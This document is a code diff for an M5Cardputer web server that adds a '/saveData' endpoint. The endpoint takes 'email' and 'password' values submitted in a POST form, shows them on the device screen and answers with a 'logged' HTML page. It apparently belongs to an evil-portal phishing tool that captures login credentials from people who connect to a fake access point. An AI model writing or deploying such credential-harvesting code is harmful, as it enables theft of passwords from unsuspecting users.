@@ -223,6 +223,34 @@ void serverMode() {
       request->send(200, "text/plain", "Post received");
     });
 
+    server.on("/saveData", HTTP_POST, [](AsyncWebServerRequest *request){
+        M5Cardputer.Display.clear();
+        const char* email = "";
+        const char* password = "";
+
+        if(request->hasParam("email", true)) {
+          AsyncWebParameter* p = request->getParam("email", true);
+          email = p->value().c_str();
+          M5Cardputer.Display.print(email);
+        }
+
+        if(request->hasParam("password", true)) {
+          AsyncWebParameter* p = request->getParam("password", true);
+          password = p->value().c_str();
+          M5Cardputer.Display.println(password);
+        }
+
+        File file = SD.open("/html/logged.html");
+        if (file) {
+          M5Cardputer.Display.print("Sending HTML File!");
+          request->send(SD, "/html/logged.html", "text/html");
+          file.close();
+        }else{
+          M5Cardputer.Display.print("Error to show HTML file");
+        }
+  });
+
+
     // Enable CORS
     DefaultHeaders::Instance().addHeader(F("Access-Control-Allow-Origin"), F("*"));
     // server.addHeader("Access-Control-Allow-Origin", "*");
